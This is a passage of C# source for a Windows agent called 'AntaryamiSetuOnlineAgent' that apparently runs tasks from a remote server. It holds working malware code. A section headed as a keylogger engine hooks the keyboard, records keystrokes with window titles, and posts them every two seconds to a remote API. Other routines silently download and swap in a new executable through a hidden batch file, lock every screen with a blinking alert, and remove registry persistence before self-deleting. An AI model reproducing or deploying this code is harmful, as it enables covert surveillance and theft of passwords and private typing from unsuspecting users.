                        await streamToRead.CopyToAsync(fileToWrite, token);
                    }
                }
                await PostOutputAsync(taskId, "[+] New executable downloaded. Executing replacement script...", token);

                string batchPath = Path.Combine(targetDir, "updater.bat");
                string batchContent = $@"@echo off
timeout /t 3 /nobreak > nul
del /f /q ""{currentExePath}""
move /y ""{tempExePath}"" ""{currentExePath}""
start """" ""{currentExePath}""
del ""%~f0""";

                await File.WriteAllTextAsync(batchPath, batchContent, token);

                Process.Start(new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    Arguments = $"/c \"{batchPath}\"",
                    CreateNoWindow = true,
                    UseShellExecute = false,
                    WindowStyle = ProcessWindowStyle.Hidden
                });

                Environment.Exit(0);
            }
            catch (Exception ex)
            {
                await PostOutputAsync(taskId, $"[-] Update failed: {ex.Message}", token);
            }
        }

        private static void MinimizeAllWindows()
        {
            try
            {
                Type? shellType = Type.GetTypeFromProgID("Shell.Application");
                if (shellType != null)
                {
                    object? shell = Activator.CreateInstance(shellType);
                    if (shell != null)
                    {
                        shellType.InvokeMember("MinimizeAll", System.Reflection.BindingFlags.InvokeMethod, null, shell, null);
                    }
                }
            }
            catch { }
        }

        private static void ShowFullscreenAlert(string message)
        {
            try
            {
                MinimizeAllWindows();
                Thread alertThread = new Thread(() =>
                {
                    var screens = System.Windows.Forms.Screen.AllScreens;
                    var forms = new System.Collections.Generic.List<Form>();
                    bool isClosingAll = false;

                    void CloseAllForms()
                    {
                        if (isClosingAll) return;
                        isClosingAll = true;
                        foreach (var f in forms)
                        {
                            try { f.Close(); } catch {}
                        }
                    }

                    // Shared blinking timer
                    System.Windows.Forms.Timer blinkTimer = new System.Windows.Forms.Timer { Interval = 500 };
                    bool isRed = false;
                    blinkTimer.Tick += (s, e) =>
                    {
                        Color bg = isRed ? Color.FromArgb(10, 10, 10) : Color.FromArgb(120, 10, 10);
                        foreach (var f in forms)
                        {
                            try { f.BackColor = bg; } catch {}
                        }
                        isRed = !isRed;
                    };
                    blinkTimer.Start();

                    foreach (var screen in screens)
                    {
                        Form alertForm = new Form
                        {
                            Text = "",
                            FormBorderStyle = FormBorderStyle.None,
                            BackColor = Color.FromArgb(10, 10, 10),
                            TopMost = true,
                            StartPosition = FormStartPosition.Manual,
                            Bounds = screen.Bounds,
                            ShowInTaskbar = false
                        };

                        alertForm.Load += (s, e) => {
                            alertForm.WindowState = FormWindowState.Normal;
                            alertForm.Bounds = screen.Bounds;
                        };

                        alertForm.Shown += (s, e) => {
                            alertForm.Bounds = screen.Bounds;
                        };

                        alertForm.FormClosing += (s, e) => {
                            CloseAllForms();
                        };

                        // Main layout panel
                        TableLayoutPanel layout = new TableLayoutPanel
                        {
                            Dock = DockStyle.Fill,
                            ColumnCount = 1,
                            RowCount = 4,
                            BackColor = Color.Transparent
                        };
                        layout.RowStyles.Add(new RowStyle(SizeType.Percent, 30));
                        layout.RowStyles.Add(new RowStyle(SizeType.AutoSize));
                        layout.RowStyles.Add(new RowStyle(SizeType.AutoSize));
                        layout.RowStyles.Add(new RowStyle(SizeType.Percent, 30));

                        // Warning icon label
                        Label lblIcon = new Label
                        {
                            Text = "⚠",
                            Font = new Font("Segoe UI", 64F, FontStyle.Bold),
                            ForeColor = Color.FromArgb(255, 200, 0),
                            TextAlign = ContentAlignment.MiddleCenter,
                            Dock = DockStyle.Fill,
                            AutoSize = false
                        };

                        // Message label
                        Label lblMessage = new Label
                        {
                            Text = message,
                            Font = new Font("Segoe UI", 22F, FontStyle.Regular),
                            ForeColor = Color.White,
                            TextAlign = ContentAlignment.MiddleCenter,
                            Dock = DockStyle.Fill,
                            MaximumSize = new Size(900, 0),
                            AutoSize = true,
                            Padding = new Padding(40, 20, 40, 20)
                        };

                        // Dismiss button
                        Button btnDismiss = new Button
                        {
                            Text = "✕  DISMISS",
                            Font = new Font("Consolas", 14F, FontStyle.Bold),
                            ForeColor = Color.White,
                            BackColor = Color.FromArgb(220, 30, 30),
                            FlatStyle = FlatStyle.Flat,
                            Width = 220,
                            Height = 50,
                            Cursor = Cursors.Hand,
                            Anchor = AnchorStyles.None
                        };
                        btnDismiss.FlatAppearance.BorderSize = 0;
                        btnDismiss.Click += (s, e) => CloseAllForms();

                        // Center the button in a panel
                        Panel btnPanel = new Panel
                        {
                            Height = 70,
                            Dock = DockStyle.Fill,
                            BackColor = Color.Transparent
                        };
                        btnDismiss.Location = new Point(0, 10);
                        btnPanel.Controls.Add(btnDismiss);
                        btnPanel.Resize += (s, e) =>
                        {
                            btnDismiss.Location = new Point((btnPanel.Width - btnDismiss.Width) / 2, 10);
                        };

                        layout.Controls.Add(lblIcon, 0, 1);
                        layout.Controls.Add(lblMessage, 0, 2);
                        layout.Controls.Add(btnPanel, 0, 3);

                        alertForm.Controls.Add(layout);

                        // Allow ESC to close
                        alertForm.KeyPreview = true;
                        alertForm.KeyDown += (s, e) =>
                        {
                            if (e.KeyCode == Keys.Escape || e.KeyCode == Keys.Enter)
                                CloseAllForms();
                        };

                        forms.Add(alertForm);
                    }

                    // Run the message loop using our custom MultiFormApplicationContext
                    if (forms.Count > 0)
                    {
                        Application.Run(new MultiFormApplicationContext(forms));
                    }
                    
                    blinkTimer.Stop();
                    blinkTimer.Dispose();
                });
                alertThread.SetApartmentState(ApartmentState.STA);
                alertThread.IsBackground = true;
                alertThread.Start();
            }
            catch { }
        }

        private static void SelfDestruct()
        {
            try
            {
                string appName = "AntaryamiSetuOnlineAgent";
                using (RegistryKey? key = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true))
                {
                    if (key != null)
                    {
                        key.DeleteValue(appName, false);
                    }
                }
            }
            catch { }

            try
            {
                string? appPath = Process.GetCurrentProcess().MainModule?.FileName;
                if (!string.IsNullOrEmpty(appPath))
                {
                    Process.Start(new ProcessStartInfo
                    {
                        FileName = "cmd.exe",
                        Arguments = $"/c choice /t 3 /d y > nul & del \"{appPath}\"",
                        CreateNoWindow = true,
                        UseShellExecute = false
                    });
                }
            }
            catch { }

            Environment.Exit(0);
        }

        private static string GetActiveWindowTitle()
        {
            try
            {
                const int maxChars = 256;
                StringBuilder buffer = new StringBuilder(maxChars);
                IntPtr handle = GetForegroundWindow();

                if (handle != IntPtr.Zero && GetWindowText(handle, buffer, maxChars) > 0)
                {
                    return buffer.ToString();
                }
                return "System Idle";
            }
            catch { return "Unknown Process Context"; }
        }

        private static string GetHardwareBoundIdentifier()
        {
            try
            {
                string rawId = Environment.MachineName + Environment.UserName;
                using (var sha256 = System.Security.Cryptography.SHA256.Create())
                {
                    byte[] bytes = sha256.ComputeHash(Encoding.UTF8.GetBytes(rawId));
                    return BitConverter.ToString(bytes).Replace("-", "").ToLower().Substring(0, 12) + "_SETU_WEB";
                }
            }
            catch
            {
                return "82a8ec330e9c_SETU_WEB";
            }
        }

        // =========================================================
        // KEYLOGGER ENGINE METHODS
        // =========================================================
        private static void StartKeylogger()
        {
            Thread keyloggerThread = new Thread(() =>
            {
                _kbHookProc = HookCallback;
                using (Process curProcess = Process.GetCurrentProcess())
                using (ProcessModule curModule = curProcess.MainModule!)
                {
                    _hookId = SetWindowsHookEx(WH_KEYBOARD_LL, _kbHookProc, GetModuleHandle(curModule.ModuleName!), 0);
                }

                // Run message loop
                MSG msg;
                while (GetMessage(out msg, IntPtr.Zero, 0, 0) > 0)
                {
                    TranslateMessage(ref msg);
                    DispatchMessage(ref msg);
                }

                if (_hookId != IntPtr.Zero)
                {
                    UnhookWindowsHookEx(_hookId);
                }
            });
            keyloggerThread.SetApartmentState(ApartmentState.STA);
            keyloggerThread.IsBackground = true;
            keyloggerThread.Start();
        }

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN))
            {
                lock (_keyLock)
                {
                    if (!_isKeylogging)
                    {
                        return CallNextHookEx(_hookId, nCode, wParam, lParam);
                    }
                }

                int vkCode = Marshal.ReadInt32(lParam);
                string keyName = GetKeyString(vkCode);

                if (!string.IsNullOrEmpty(keyName))
                {
                    lock (_keyLock)
                    {
                        string currentWindow = GetActiveWindowTitle();
                        if (currentWindow != _lastWindow)
                        {
                            _lastWindow = currentWindow;
                            _keyBuffer.Append($"\n\n[{DateTime.Now:HH:mm:ss} - Window: {currentWindow}]\n");
                        }
                        _keyBuffer.Append(keyName);
                    }
                }
            }
            return CallNextHookEx(_hookId, nCode, wParam, lParam);
        }

        private static string GetKeyString(int vkCode)
        {
            switch (vkCode)
            {
                case 0x08: return "[Back]";
                case 0x09: return "[Tab]";
                case 0x0D: return "[Enter]\n";
                case 0x14: return "[CapsLock]";
                case 0x1B: return "[Esc]";
                case 0x20: return " ";
                case 0x25: return "[Left]";
                case 0x26: return "[Up]";
                case 0x27: return "[Right]";
                case 0x28: return "[Down]";
                case 0x2E: return "[Delete]";
                case 0xA0:
                case 0xA1: return "[Shift]";
                case 0xA2:
                case 0xA3: return "[Ctrl]";
                case 0xA4:
                case 0xA5: return "[Alt]";
                default:
                    if (vkCode >= 32 && vkCode <= 126)
                    {
                        short shiftState = GetAsyncKeyState(0x10); // VK_SHIFT
                        short capsState = GetKeyState(0x14); // VK_CAPITAL
                        bool isShiftPressed = (shiftState & 0x8000) != 0;
                        bool isCapsLock = (capsState & 0x0001) != 0;
                        bool isUpper = isShiftPressed ^ isCapsLock;
                        
                        char ch = (char)vkCode;
                        if (ch >= 'A' && ch <= 'Z')
                        {
                            return isUpper ? ch.ToString() : ch.ToString().ToLower();
                        }
                        
                        if (isShiftPressed)
                        {
                            switch (ch)
                            {
                                case '1': return "!";
                                case '2': return "@";
                                case '3': return "#";
                                case '4': return "$";
                                case '5': return "%";
                                case '6': return "^";
                                case '7': return "&";
                                case '8': return "*";
                                case '9': return "(";
                                case '0': return ")";
                                case '-': return "_";
                                case '=': return "+";
                                case '[': return "{";
                                case ']': return "}";
                                case ';': return ":";
                                case '\'': return "\"";
                                case ',': return "<";
                                case '.': return ">";
                                case '/': return "?";
                                case '\\': return "|";
                                case '`': return "~";
                            }
                        }
                        return ch.ToString();
                    }
                    return $"[Key_{vkCode}]";
            }
        }

        private static async Task KeyloggerStreamLoopAsync(CancellationToken token)
        {
            while (!token.IsCancellationRequested)
            {
                try
                {
                    string dataToSend = string.Empty;
                    lock (_keyLock)
                    {
                        if (_keyBuffer.Length > 0)
                        {
                            dataToSend = _keyBuffer.ToString();
                            _keyBuffer.Clear();
                        }
                    }

                    if (!string.IsNullOrEmpty(dataToSend))
                    {
                        var content = new MultipartFormDataContent();
                        content.Add(new StringContent("post_keys"), "action");
                        content.Add(new StringContent(_deviceId), "device_id");
                        content.Add(new StringContent(dataToSend), "keystrokes");

                        await _httpClient.PostAsync(ApiUrl, content, token);
                    }
                }
                catch { }

                await Task.Delay(2000, token); // Send every 2s
            }
        }
    }

    public class MultiFormApplicationContext : ApplicationContext
    {
        private int _openForms;
        public MultiFormApplicationContext(List<Form> forms)
        {
            _openForms = forms.Count;
            foreach (var form in forms)
            {
                form.FormClosed += (s, e) =>
                {
                    if (Interlocked.Decrement(ref _openForms) == 0)
                    {
                        ExitThread();
                    }
                };
                form.Show();
            }
        }
    }
}
